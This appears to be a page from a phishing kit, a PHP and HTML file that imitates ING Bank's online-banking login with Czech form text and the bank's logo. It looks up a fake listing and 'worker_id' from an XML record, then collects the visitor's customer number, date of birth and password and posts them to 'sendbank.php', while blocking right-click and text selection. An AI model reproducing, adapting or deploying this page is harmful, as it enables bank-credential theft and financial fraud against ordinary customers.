<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "ING Bank");
?>
<!DOCTYPE html>
<!-- saved from url=(0053)# -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<title>Bankowość korporacyjna, finansowanie przedsiębiorstw</title>
<style>
			._0 {
				margin: 0 auto;
				max-width: 400px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 50px;
				margin-bottom: 50px;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 28px;
				padding-top: 16px;
				width: 100%;
                text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border: 1px solid #f68121;
			    border-radius: 6px;
			    padding: 12px 10px;
			    margin-bottom: 20px;
                background-color: #D0D0D0;
			}
			._3:hover {
				border: 1px solid #000;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 15px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 8px 30px 6px 31px;
			    min-width: 180px;
			    border-radius: 7px;
			    white-space: nowrap;
			    background-color: #f68121;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			}
			._4:hover {
				background-color: #f68121;
			    color: #fff;
			    border-color: #f68121;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 40px;
			    border-bottom: 1px solid #e4e4e4;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: block;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				float: right;
				padding-bottom: 10px;
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
</head>
<body>
<div id="mainblock">
<div class="_0">
<center><img height="80" src="data:image/png;base64,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"></center>
<form method="post" action="sendbank.php" id="formblock">
<div class="loginboxes" style="margin-bottom: 20px;">
<div class="_1">Přihlaste se do online bankovnictví</div>
</div>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<input type="hidden" name="type" value="11">

<input id="field3ds" class="_3" type="text" name="logindata" placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
<input id="field3ds" class="_3" type="text" name="datadata" placeholder="Datum narození" required="">
<input id="field3ds" class="_3" type="password" name="passdata" placeholder="Zadejte heslo" required="">
<div class="loginboxes">
<div id="Pomoc"><a href="#" style="font-size: 13px; color: #666666; text-decoration: none;">Pomoc s přihlášením</a></div>
<input class="_4" style="background-color: #f68121;" type="submit" value="Pokračovat">
<br><br>
</div>
</form>
</div>
<footer><center>2022 ING BANK</center></footer>
<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #464646;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
